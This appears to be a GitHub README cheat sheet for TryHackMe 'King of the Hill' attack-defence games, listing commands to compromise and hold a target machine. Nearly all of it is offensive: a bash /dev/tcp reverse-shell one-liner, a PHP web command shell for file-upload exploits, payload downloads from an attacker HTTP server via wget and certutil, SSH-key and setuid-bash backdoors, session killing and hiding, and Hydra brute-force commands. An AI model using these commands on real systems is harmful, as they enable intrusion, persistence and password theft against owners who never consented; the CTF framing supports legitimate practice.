# Koth 👨🏻‍💻Hacker Vs Hacker👨🏻‍💻 Techniques
TryHackMe KOTH Cheatsheet  
-----------------------------   
<div align="center">

![3](https://media.giphy.com/media/oVvhEYvWDvE1G/giphy.gif)
</div>

***Description:***
In the King of the Hill (KoTH) Attack-Defence challenge, your goal is to compromise the target machine and gain access to the coveted /root/king.txt file on Linux machines or C:\king.txt (or C:\Users\Administrator\king-server\king.txt) on Windows machines. Once you've successfully breached the system, your task is to maintain access and defend the king file from other players.

-----------------------------  
<div align="center">

![3](https://media.giphy.com/media/xsCevAab5ufj37BeGR/giphy.gif)
</div>

## --> [ Hacker Vs Hacker ] <--
 
- ***you can check who is on the machine, by using the following command.*** 
```
ps aux | grep pts
```
- ***If you're looking for your pts id/number:*** 
```
tty
```
- ***killing session of other players:***
```
pkill -9 -t pts/$0   # Here $0 = pts/id number
```


- ***If your opponent killing your session, again and again. you can use this command to hide your shell (pts id) on the machine***

- ***To get the PID of your PTS.***

```
ps aux 
```
- ***Hide your PTS***
```
mount -o bind /tmp /proc/your-PID-here
```
***if you use this command then your opponent will not be able to kill your session Anymore ;)*** 

## --> [ Useful Websites to get Reverse shell & Privilege escalation ] <--


- ***Use this website to generate Reverse shell command (bash,python,PHP,socat)☠️***
```
https://www.revshells.com/ 
```
- ***Reverse Shell generator + other Useful commands for basic penetration  testing🛠️***
```
https://tex2e.github.io/reverse-shell-generator/index.html
```

- ***Easy to Remember Reverse shell 🐚  oneliner***
```
bash -c "bash -i >& /dev/tcp/0.0.0.0/4444 0>&1"
```

- ***Use this github repo to get code of php-reverse-shell.php 🐒*** 
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 
```
- ***GTFoBins is a curated list of Unix binaries that can be used to escalate Privilege:***
``` 
https://gtfobins.github.io/ 
```
## --> [ Finding Binaries and flags ] <--  
<div align="center">

![3](https://media.giphy.com/media/xT8qAXT3f4sZTvjqZq/giphy.gif)
</div>

- ***If you're looking for Binaries that has root permissions:***
```
1) find / -perm -u=s -type f 2>/dev/null
```
```
2) find / -type f \( -perm -4000 -o -perm -2000 \) -print 
```
```
3) find / -perm /4000 2>/dev/null
```
```
4) find / -type f -user root -perm -u=s 2>/dev/null
```

- ***If you're looking for Binaries that has Sudo permissions:***
```
sudo -l 
```
- ***If you're looking for Flags:***
```
1) find / -type f -name "user.txt" 2>/dev/null
```
```
2) find / -name root.txt 2>/dev/null 
```
```
3) find / -name .flag 2>/dev/null
```

## --> [ Changing User Password ] <--

- ***Change the password for the root user and other existing users using one-liners:***

```
1) echo -e "YOURpassword\nYOURpassword" | passwd root
```
```
2) echo -e "YOURpassword\nYOURpassword" | passwd user 
```

## --> [ Protect Your Name in King.txt ] <--  

- ***protect king.txt using chattr.***

***[Activate]***
```
chattr +i king.txt 

```
***[Deactivate]***
```
chattr -i king.txt 

```

- ***Use chattr loops to protect  lock your name in king.txt***

```
while [ 1 ]; do chattr -ia /root/king.txt 2>/dev/null; echo -n "YourNick" >| /root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done &  

```
- ***Use Chattr for lock /root folder:***
```
cd / && chattr +i root
```
## --> [ Remove && Install Chattr binarie in target machine ] <--

***It is forbidden to change the permission of binaries in Koth Match, for example give a chmod 700 /usr/bin/find, except chattr, the chattr binary is allowed to remove from the machine.( remove from the machine after you use: [Activate] chattr +i king.txt ).*** 
 
- ***Remove chattr so no one will be able to change the attributes of king.txt***
- 
***[Deactivate]*** 
```
rm /usr/bin/chattr
```
- ***but if you have access to a koth box and you don't have chattr you can get a chattr binary from github and compile it on the machine:***
```
wget https://raw.githubusercontent.com/posborne/linux-programming-interface-exercises/master/15-file-attributes/chattr.c 
```
```
gcc chattr.c -o chattr 
```
```
./chattr +i king.txt 
```

## --> [ Unmount other player name from king.txt] <--

***if you try to put your nick  in /root/king.txt and the message "Read-only file system" appears, that means the other player is used Mount technique.*** 

- ***Unmount king.txt using umount:***
```
umount -l /root
umount -l /root/king.txt 
```
## PHP Web CMD Shell

**Get Shell by exploiting file upload Vulnerability**

![Web-CMD-shell-search](https://github.com/DevVj-1/Koth-Hacker-Vs-Hacker_Techniques-/assets/106962581/eb2697f2-7a85-4744-90ae-a7337e52b134)


```
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

## ---> Shell Persistence using SSH <---

<div align="center">

![3](https://media.giphy.com/media/xT8qB2HYA1vVSxooSY/giphy.gif)
</div>

**Shell Persistence using SSH - Attacker Terminal & Target Terminal**

Step 1: Navigate to the SSH directory on your Target Terminal - 

```
cd /root/.ssh
```
Step 1.2 :- Return to your attacker Terminal and execute: 
```
cd /root/.ssh
```
Step 2: Return to your attacker terminal and execute:
```
ssh-keygen -t rsa
```

[Attacker Terminal] Step 3: Display the content of id_rsa.pub using cat id_rsa.pub and copy its content using:
```
cat id_rsa.pub """ <Content> """ > authorized_keys
```
**Example:**
![Screenshot_2024-01-04_19-28-42](https://github.com/DevVj-1/Koth-Hacker-Vs-Hacker_Techniques-/assets/106962581/d90c075a-92a0-4f49-85d5-91d1d8231c89)

[Attacker Terminal] Step 4: Set the permissions for id_rsa - 
```
chmod 600 id_rsa
```

**Attacker Terminal Step 4.1: Send authorized_keys to the target system.:)**

[Target Terminal] Step 5: Set permissions for authorized_keys -

```
chmod 700 /root/.ssh
```

```
chmod 600 /root/.ssh/authorized_keys
```

[Attacker Terminal] Step 6: Connect to the target system using the generated key - 

```
ssh -i id_rsa root@127.0.0.1
```
## Shell Persistence using High privileged user/root SSH RSA-key 🔑

***To avoid the need to re-exploit the host, we stored a copy of the root users id_rsa ssh key on our
local machine as key.rsa***

![Screenshot_2024-01-27_17-51-56](https://github.com/DevVj-1/Koth-Hacker-Vs-Hacker_Techniques-/assets/106962581/ef8d06f7-b739-42b9-8401-514ee77a6ef9)   

Display the content of id_rsa using cat command and copy its content in key.rsa:
```
cat id_rsa >> key.rsa 

```
To reconnect with the key we executed 
``` 
ssh -i key.rsa root@0.0.0.0

```

## Windows MS17-010 exploit ◆

```
https://github.com/3ndG4me/AutoBlue-MS17-010

```
## Transport post privilege escalation payloads 

**Python3 Server** (Attacker Machine)

```
python3 -m http.server 8080

```

**Get install stuff in linux target**

```
wget http://0.0.0.0:8080/linpeas.sh

``` 
**Get install stuff in Windows target**

```
certutil.exe -urlcache -f http://0.0.0.0:8080/winpeas.exe

```
## Root Shell Persistence Backdoor via Bash

Run this command on your root shell to give permissions:
```
sudo chmod +s /bin/bash
```
Now, whenever you access this system again, run this command:
```
/bin/bash -p
```





# Brute-Force Attack
**Use Hydra to Brute-Force Login page**
```
 hydra -l admin -P passlist.txt www.testphp.vulnweb.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```
**Use Hydra to Brute-Force SSH service**
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.0.0.0 ssh
```
# Meterpreter as Persistence Backdoor 💀⃤
<div align="center">

![3](https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXoyYTFucjYyaWtzMHhtdHgzbGYyOTRpMmozNDZnb3hsdjk1anZtbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/UqxVRm1IaaIGk/giphy.gif)
</div>

- **[MSF-Persistence-Backdoor](https://github.com/DevVj-1/Koth-Hacker-Vs-Hacker_Techniques-/blob/main/MSF-Persistence.md)**: 
